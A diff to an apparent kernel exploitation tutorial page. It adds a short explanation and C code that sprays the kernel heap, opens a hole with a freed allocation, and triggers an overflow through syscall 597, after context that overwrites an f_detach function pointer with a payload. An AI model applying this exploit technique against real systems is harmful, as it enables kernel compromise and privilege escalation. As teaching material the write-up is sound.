@@ -664,6 +664,26 @@ kn.fn_fop = &amp;fo;
 
 fo.f_detach = payload;</code></pre>
 				
+				<p>
+					After crafting the above structures, we just spray the heap, create the hole, and perform the vulnerable system call.
+				</p>
+				
+				<pre><code>int allocation[100], m, m2;
+	
+	// Spray the heap
+	int i;
+	for(i = 0; i &lt; 100; i++) {
+		allocation[i] = kernelAllocation(bufferSize);
+	}
+	
+	// Create hole for the system call's allocation
+	m = kernelAllocation(bufferSize);
+	m2 = kernelAllocation(bufferSize);
+	kernelFree(m);
+	
+	// Perform the overflow
+	syscall(597, 1, mapping, &amp;count);</code></pre>
+				
 				<br>
 				
 				<h2>Triggering</h2>
